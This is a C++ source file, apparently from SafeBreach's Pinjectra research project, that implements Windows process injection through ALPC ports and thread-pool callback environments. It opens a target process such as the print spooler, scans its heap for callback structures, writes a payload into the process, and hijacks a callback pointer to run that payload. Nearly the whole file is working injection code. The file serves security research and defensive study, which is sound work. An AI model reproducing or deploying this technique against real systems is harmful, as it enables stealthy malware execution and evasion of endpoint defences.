// BASED ON
// https://github.com/odzhan/injection/tree/master/spooler
// https://modexp.wordpress.com/2019/03/07/process-injection-print-spooler/

// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include <iostream>

#include "ALPC.h"

extern "C" {
#include "memmem.h"
}

///////////////
// Functions //
///////////////

BOOL CodeViaALPC::IsValidCBE(HANDLE hProcess, PTP_CALLBACK_ENVIRONX cbe) {
	MEMORY_BASIC_INFORMATION mbi;
	SIZE_T                   res;

	// invalid version?
	if (cbe->Version > 5) return FALSE;

	// these values shouldn't be empty
	if (cbe->Pool == 0 ||
		cbe->FinalizationCallback == 0) return FALSE;

	// these values should be equal
	if ((LPVOID)cbe->FinalizationCallback !=
		(LPVOID)cbe->ActivationContext) return FALSE;

	// priority shouldn't exceed TP_CALLBACK_PRIORITY_INVALID
	if (cbe->CallbackPriority > TP_CALLBACK_PRIORITY_INVALID) return FALSE;

	// the pool functions should originate from read-only memory
	res = VirtualQueryEx(hProcess, (LPVOID)cbe->Pool, &mbi, sizeof(mbi));

	if (res != sizeof(mbi)) return FALSE;
	if (!(mbi.Protect & PAGE_READONLY)) return FALSE;

	// the callback function should originate from read+execute memory
	res = VirtualQueryEx(hProcess,
		(LPCVOID)cbe->Callback, &mbi, sizeof(mbi));

	if (res != sizeof(mbi)) return FALSE;
	return (mbi.Protect & PAGE_EXECUTE_READ);
}

/**
  Get a list of ALPC ports with names
*/
DWORD64 CodeViaALPC::GetALPCPorts(process_info* pi)
{
	ULONG                      len = 0, total = 0;
	NTSTATUS                   status;
	LPVOID                     list = NULL;
	DWORD                      i;
	HANDLE                     hObj;
	PSYSTEM_HANDLE_INFORMATION hl;
	POBJECT_NAME_INFORMATION   objName;

	NTFUNC(NtQuerySystemInformation, "NtQuerySystemInformation", (IN SYSTEM_INFORMATION_CLASS, OUT PVOID, IN ULONG, OUT PULONG));
	NTFUNC(NtDuplicateObject, "NtDuplicateObject", (IN HANDLE, IN HANDLE, IN HANDLE, OUT PHANDLE, IN ACCESS_MASK, IN ULONG, IN ULONG));
	NTFUNC(NtQueryObject, "NtQueryObject", (HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG));
	NTFUNC(NtClose, "NtClose", (HANDLE));

	pi->ports.clear();

#define MAX_BUFSIZ 8192
	// get a list of handles for the local system
	for (len = MAX_BUFSIZ;; len += MAX_BUFSIZ) {
		list = malloc(len);
		status = NtQuerySystemInformation(
			SystemHandleInformation, list, len, &total);
		// break from loop if ok
		if (NT_SUCCESS(status)) break;
		// free list and continue
		free(list);
	}

	hl = (PSYSTEM_HANDLE_INFORMATION)list;
	objName = (POBJECT_NAME_INFORMATION)malloc(8192);

	// for each handle
	for (i = 0; i < hl->HandleCount; i++) {
		// skip if process ids don't match
		if (hl->Handles[i].uIdProcess != pi->pid) continue;

		//printf("Found a port in the target process!\n");

		// skip if the type isn't an ALPC port
		// note this value might be different on other systems.
		// this was tested on 64-bit Windows 10
		if (hl->Handles[i].ObjectType != 45) continue;

		// duplicate the handle object
		status = NtDuplicateObject(
			pi->hp, (HANDLE)hl->Handles[i].Handle,
			GetCurrentProcess(), &hObj, 0, 0, 0);

		// continue with next entry if we failed
		if (!NT_SUCCESS(status)) continue;

		// try query the name
		status = NtQueryObject(hObj,
			ObjectTypeInformation, objName, 8192, NULL);

		// got it okay?
		if (NT_SUCCESS(status) && objName->Name.Buffer != NULL) {
			// save to list
			printf("Found a good ALPC port!!! (%S)\n", objName->Name.Buffer);
			pi->ports.push_back(objName->Name.Buffer);
		}
		// close handle object
		NtClose(hObj);
	}
	// free list of handles
	free(objName);
	free(list);
	return pi->ports.size();
}

// connect to ALPC port
BOOL CodeViaALPC::ALPC_Connect(std::wstring path) {
	SECURITY_QUALITY_OF_SERVICE ss;
	NTSTATUS                    status;
	UNICODE_STRING              server;
	ULONG                       MsgLen = 0;
	HANDLE                      h;

	NTFUNC(RtlInitUnicodeString, "RtlInitUnicodeString", (PUNICODE_STRING, PCWSTR));
	NTFUNC(NtConnectPort, "NtConnectPort", (OUT PHANDLE, IN PUNICODE_STRING, IN PSECURITY_QUALITY_OF_SERVICE, IN OUT PVOID, OUT PVOID, OUT PULONG, IN PVOID, IN PULONG));
	NTFUNC(NtClose, "NtClose", (HANDLE));

	ZeroMemory(&ss, sizeof(ss));
	ss.Length = sizeof(ss);
	ss.ImpersonationLevel = SecurityImpersonation;
	ss.EffectiveOnly = FALSE;
	ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

	RtlInitUnicodeString(&server, path.c_str());

	status = NtConnectPort(&h, &server, &ss, NULL,
		NULL, (PULONG)& MsgLen, NULL, NULL);
	if (NT_SUCCESS(status))
	{
		NtClose(h);
	}

	return NT_SUCCESS(status);
}

// try inject and run payload in remote process using CBE
BOOL CodeViaALPC::ALPC_deploy(process_info* pi, LPVOID ds, PTP_CALLBACK_ENVIRONX cbe)
{
	LPVOID               cs = NULL;
	BOOL                 bInject = FALSE;
	TP_CALLBACK_ENVIRONX cpy;    // local copy of cbe
	SIZE_T               wr;
	tp_param             tp;
	DWORD                i;
	RUNTIME_MEM_ENTRY* result;

	result = this->m_memwriter->writeto(pi->hp, sizeof(tp_param));

	// memcpy(pi->payload, payload, sizeof(payload));
	pi->payloadSize = result->tot_write;
	cs = result->addr;

	// backup CBE
	CopyMemory(&cpy, cbe, sizeof(TP_CALLBACK_ENVIRONX));
	// copy original callback address and parameter
	tp.Callback = cpy.Callback;
	tp.CallbackParameter = cpy.CallbackParameter;
	// write callback+parameter to remote process
	WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
	// update original callback with address of payload and parameter
	cpy.Callback = (DWORD64)cs;
	//cpy.Callback = 17 + (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "memset");
	cpy.CallbackParameter = (DWORD64)(LPBYTE)cs + pi->payloadSize;
	// update CBE in remote process
	WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
	// trigger execution of payload
	for (i = 0; i < pi->ports.size(); i++) {
		ALPC_Connect(pi->ports[i]);
		printf("Back from ALPC_Connect %d\n", i);
		// read back the CBE
		ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
		// if callback pointer is the original, we succeeded.
		bInject = (cpy.Callback == cbe->Callback);
		if (bInject) break;
	}
	// restore the original cbe
	WriteProcessMemory(pi->hp, ds, cbe, sizeof(cpy), &wr);
	// release memory for payload
	VirtualFreeEx(pi->hp, cs,
		pi->payloadSize + sizeof(tp), MEM_RELEASE);

	return bInject;
}

// try to locate valid callback objects in remote process
BOOL CodeViaALPC::FindCallback(process_info * pi, LPVOID BaseAddress, SIZE_T RegionSize)
{
	LPBYTE             addr = (LPBYTE)BaseAddress;
	SIZE_T             pos;
	BOOL               bRead, bFound = FALSE;
	SIZE_T             rd;
	TP_CALLBACK_ENVIRONX tco;
	//WCHAR              filename[MAX_PATH];

	// scan memory for TCO
	for (pos = 0; pos < RegionSize;
		pos += (bFound ? sizeof(tco) : sizeof(DWORD64)))
	{
		bFound = FALSE;
		// try read TCO from writeable memory
		bRead = ReadProcessMemory(pi->hp,
			&addr[pos], &tco, sizeof(TP_CALLBACK_ENVIRONX), &rd);

		// if not read, continue
		if (!bRead) continue;
		// if not size of callback environ, continue
		if (rd != sizeof(TP_CALLBACK_ENVIRONX)) continue;

		// is this a valid TCO?
		if (IsValidCBE(pi->hp, &tco))
		{
			printf("Found a good TCO!!!\n");
			ALPC_deploy(pi, &addr[pos], &tco);
		}
	}
	return bFound;
}

BOOL CodeViaALPC::ScanProcess(process_info * pi) {
	HANDLE                   hProcess;
	SYSTEM_INFO              si;
	MEMORY_BASIC_INFORMATION mbi;
	LPBYTE                   addr;     // current address
	SIZE_T                   res;
	BOOL                     bInject = FALSE;

	// try locate the callback environ used for ALPC in print spooler
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);

	// if process opened
	if (hProcess != NULL) {
		// get memory info
		GetSystemInfo(&si);

		for (addr = 0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
			ZeroMemory(&mbi, sizeof(mbi));
			res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

			// we only want to scan the heap, but this will scan stack space too.
			// need to fix that..
			if ((mbi.State == MEM_COMMIT) &&
				(mbi.Type == MEM_PRIVATE) &&
				(mbi.Protect == PAGE_READWRITE))
			{
				bInject = FindCallback(pi, mbi.BaseAddress, mbi.RegionSize);
				if (bInject) break;
			}
			addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
		}
		CloseHandle(hProcess);
	}
	return bInject;
}

/////////////
// Classes //
/////////////

CodeViaALPC::~CodeViaALPC()
{
}

boolean CodeViaALPC::inject(DWORD pid, DWORD tid)
{
	HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	process_info pi;
	pi.hp = p;
	pi.pid = pid;
//	pi.payload = (BYTE*)new char[1000];
	GetALPCPorts(&pi);
	ScanProcess(&pi);
	return true;
}
